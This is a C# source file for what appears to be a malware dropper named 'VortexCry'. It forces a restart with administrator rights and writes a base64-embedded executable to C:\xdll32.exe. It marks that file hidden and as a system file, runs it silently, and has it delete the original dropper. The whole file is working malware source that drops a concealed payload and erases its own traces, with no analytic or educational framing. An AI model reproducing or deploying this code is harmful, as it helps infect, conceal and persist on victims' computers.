using System;
using System.Diagnostics;
using System.IO;
using VortexSecOps.HarmfulSysHacks;

namespace VortexCry
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (!MalwareIntruder.IsRunningAsAdministrator())
            {
                MalwareIntruder.RestartCurrentAppAsAdmin();
            }
            string xdll32_path = @"C:\xdll32.exe";
            FileInfo fileInfo = new FileInfo(xdll32_path);
            if (fileInfo.Exists)
            {
                fileInfo.Delete();
            }
            File.WriteAllBytes(xdll32_path, Convert.FromBase64String(Xdll32.xdll32));
            fileInfo.Attributes = FileAttributes.System | FileAttributes.Hidden;
            string path = Process.GetCurrentProcess().MainModule.FileName;
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = xdll32_path,
                Arguments = $"/del \"{path}\"",
                Verb = "runas",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process process = Process.Start(startInfo);
            Environment.Exit(0);
        }
    }
}